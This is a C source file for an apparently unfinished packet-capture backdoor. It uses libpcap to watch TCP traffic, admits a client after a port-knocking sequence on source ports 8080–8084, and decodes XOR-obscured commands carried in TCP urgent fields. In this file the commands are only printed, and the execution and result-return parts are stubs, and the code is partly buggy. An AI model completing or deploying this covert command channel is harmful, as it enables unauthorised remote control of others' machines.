/*-----------------------------------------------------------------------------------------------
--	Source File:	pktcap.c - Contains the main datagram receiving functions used by pscan.c
--
--	Functions:	Misc libpcap functions- packet filtering library based on the BSD 
--			packet filter (BPF)
--
--	Interface:	void * ReceiveDatagram (void *pcap_arg)
--				pcap_arg - pointer which will be cast into a pointer to 
--					   struct PcapInfo 
--			    struct PcapInfo: contains all of the packet capture components
--				pcap_t* nic_descr - descriptor to the active NIC
--				bpf_u_int32 netp - address/subnet mask
--				char cmd[MAXLINE] - Packet Filter string to be compiled into the NIC
--
--	Date:		June 24, 2011
--
--	Revisions:	(Date and Description)
--
--	Designer:	Aman Abdulla
--
--	Programmer:	Aman Abdulla
--
--	Notes:
--	This function will use the address and filter string and use them in the pcap_compile() and 
-- 	pcap_setfilter() functions to selectively capture packets of interest. It then invokes 
--	the main callback function to start the packet capture loop.
--
--
--	
-------------------------------------------------------------------------------------------------*/
#include "backjake.h"

static int i = 0;
int auth[3] = {0};
int tries[10] = {0};
int fails = 0;
char command[64] = {0};

static void endProgram (int signo);

void* ReceiveDatagram (void *pcap_arg)
{ 
	printf("Reading!\n");
	struct bpf_program fp;
	PcapInfo *pcap_ptr = (PcapInfo *)pcap_arg;
		
	pcapCompile(pcap_ptr, &fp);
	pcapFilter(pcap_ptr, &fp);
	pcapListen(pcap_ptr);

	return NULL;
}

void setupSignals()
{
    if (signal(SIGINT, endProgram) == SIG_ERR)
        perror("signal(SIGINT) error");    
}

void pcapListen(PcapInfo * pcap_ptr)
{
	void *status = NULL;

	pcap_loop (pcap_ptr->nic_descr, -1, packetHandler, NULL);

	if (ExitFlag == TRUE)
	{
		pthread_exit (status);
	}
	
	exit (0);
}

void pcapCompile(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if(pcap_compile (pcap_ptr->nic_descr, fp, pcap_ptr->cmd, 0, pcap_ptr->netp) == -1)
	{ 
		fprintf(stderr,"Error calling pcap_compile\n"); 
		exit(1); 
	}
}

void pcapFilter(PcapInfo * pcap_ptr, struct bpf_program * fp)
{
	if (pcap_setfilter(pcap_ptr->nic_descr, fp) == -1)
	{ 
		fprintf(stderr,"Error setting filter\n"); 
		exit(1); 
	}
}

int checkPacketSize()
{
	return ((sizeof(struct ethhdr) + sizeof(struct iphdr) + sizeof(struct tcphdr)) > 40);
}

void packetHandler(u_char *ptr_null, const struct pcap_pkthdr* pkthdr, const u_char* packet)
{
	struct ethhdr *ethernet_header;
	struct iphdr *ip_header;
	struct tcphdr *tcp_header;

	if (checkPacketSize())
	{
		ethernet_header = (struct ethhdr *)packet;
		if(ntohs(ethernet_header->h_proto) == ETH_P_IP)
		{
			ip_header = (struct iphdr *)(packet + sizeof(struct ethhdr));	
			if(ip_header->protocol == IPPROTO_TCP)
			{
				tcp_header = (struct tcphdr*)(packet + sizeof(struct ethhdr) + ip_header->ihl*4);
				
				if(authenticated(ip_header->saddr))
				{
					runCommand(decryptPacket(tcp_header));
					//pthread_create() // make the thread for sending the results back
				} else {
					authenticateClient(ip_header, tcp_header);
				}

			}
		}
	}
	ExitFlag = TRUE;
}

char* decryptPacket(struct tcphdr* tcp_header)
{
	char temp[3] = {0};
	sprintf(temp, "%d", tcp_header->urg);
	strcat(command, temp);

	if (temp[0] == 21)
	{
		XOR();
		return command;
	}

	return "";
}

void XOR()
{
	size_t l = 0;
	for(l = 0; l < strlen(command); l++)
	{
		command[l] = command[l] ^ 15;
	}
}

void runCommand(char* command)
{
	if (strcmp(command, "") != 0)
		printf("%s\n", command);
}

int authenticated(int ip)
{
	size_t k = 0;
	for (k = 0; k < (sizeof(auth) / sizeof(int)); k++)
		if (ip == auth[0])
			return 1;
	return 0;
}

int PrintInHex(char *mesg, unsigned char *p, int len)
{
	printf(mesg);

	while(len--)
	{
		printf("%.2X ", *p);
		p++;
	}
	printf("\n");
	return 0;
}

int authenticateClient(struct iphdr* ip_header, struct tcphdr* tcp_header)
{
	int correct[] = {8080, 8081, 8082, 8083, 8084}; // change this later
	size_t j = 0;
    size_t temp = sizeof(correct) / sizeof(int);
				
	if (i == temp)
	{
		i = 0;
	}

	tries[i++] = (int) ntohs(tcp_header->source);

	for (j=0; j<=temp; j++)
	{
		//printf("i:%d j:%zu temp:%zu try:%d cor:%d\n", i, j, temp, tries[j], correct[j]);
		if(tries[j] != correct[j])
		{
			fails++;
			break;
		}

		if (j == temp - 1)
		{
			printf("============ AUTH ============\n"); // change this later
			auth[0] = ip_header->saddr;
			//printf("%d\n", auth[0]);

			for (j=0; j<=temp; j++)
				tries[j]=0;

			i = 0;
			fails = 0;
			return 1;
		}
	}

	if (fails == temp+1)
	{
		for (j=0; j<=temp; j++)
			tries[j]=0;
		i = 0;
		fails=0;
	}

	return 0;
}

void* knockListener(void* pcap_arg)
{
    // NOT YET IMPLEMENTED
    //
    return NULL;
}

void executeCommand()
{
    //spawnThread();
}

static void endProgram (int signo)
{
    // stop the program
    exit(1);
}